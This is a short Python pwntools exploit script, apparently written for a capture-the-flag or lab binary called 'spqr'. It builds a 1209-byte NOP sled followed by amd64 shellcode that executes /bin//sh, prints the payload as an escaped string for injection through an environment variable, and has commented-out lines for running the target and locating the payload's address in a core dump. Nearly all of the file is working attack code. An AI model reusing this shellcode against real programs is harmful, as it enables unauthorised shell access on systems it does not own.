from pwn import *
import sys
import struct
import os

context.clear(arch='amd64')

nops = b'\x90'*1209
shell0 = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
env_payload = nops + shell0

string_of_env_payload = "\\x90" * 1209 + "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
print(string_of_env_payload)

#p = process('./spqr')

#p.sendline('aaaaaaaaaaaaaaaa')
#p.wait()

#print("EXPLOIT addr: ", hex(p.corefile.env['EXPLOIT']))
